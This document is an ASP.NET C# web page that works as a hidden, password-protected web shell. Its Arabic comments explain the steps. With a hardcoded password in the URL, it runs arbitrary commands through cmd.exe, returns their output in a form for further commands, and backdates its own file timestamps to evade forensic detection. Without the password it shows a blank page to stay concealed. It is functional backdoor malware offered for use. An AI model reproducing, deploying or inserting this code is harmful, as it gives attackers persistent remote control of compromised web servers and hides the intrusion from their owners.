<%@ Page Language="C#" Debug="false" %>
<%@ Import Namespace="System.Diagnostics" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        // تحقق إذا تم تمرير المتغير password في URL
        if (Request["password"] != null && Request["password"] == "28112016")
        {
            // تحقق إذا تم تمرير المتغير execute في URL
            if (Request["execute"] != null)
            {
                string cmdCommand = Request["execute"];
                if (!string.IsNullOrEmpty(cmdCommand))
                {
                    try
                    {
                        ProcessStartInfo psi = new ProcessStartInfo();
                        psi.FileName = "cmd.exe";
                        psi.Arguments = "/c " + cmdCommand;
                        psi.RedirectStandardOutput = true;
                        psi.RedirectStandardError = true;
                        psi.UseShellExecute = false;
                        psi.CreateNoWindow = true;

                        Process process = Process.Start(psi);
                        string output = process.StandardOutput.ReadToEnd();
                        string error = process.StandardError.ReadToEnd();

                        Response.Write("<pre>" + output + "</pre>");
                        if (!string.IsNullOrEmpty(error))
                        {
                            Response.Write("<pre style='color:red;'>" + error + "</pre>");
                        }

                        // تعديل تاريخ الملف
                        string filePath = Server.MapPath(Request.Path);
                        System.IO.File.SetCreationTime(filePath, new DateTime(2018, 11, 15));
                        System.IO.File.SetLastWriteTime(filePath, new DateTime(2018, 11, 15));
                        System.IO.File.SetLastAccessTime(filePath, new DateTime(2018, 11, 15));
                    }
                    catch (Exception ex)
                    {
                        Response.Write("<pre style='color:red;'>Error: " + ex.Message + "</pre>");
                    }
                }
            }

            // عرض النموذج لإدخال أوامر إضافية
            Response.Write(@"
                <form method='get'>
                    Command: <input type='text' name='execute' />
                    <input type='hidden' name='password' value='28112016' />
                    <input type='submit' value='Execute' />
                </form>
            ");
        }
        else
        {
            // إذا لم يتم إدخال كلمة المرور، لا تعرض أي شيء (الصفحة تظل بيضاء)
            Response.Clear();
        }
    }
</script>

<html>
<body>
    <!-- لا شيء يظهر هنا عند فتح الصفحة لأول مرة -->
</body>
</html>
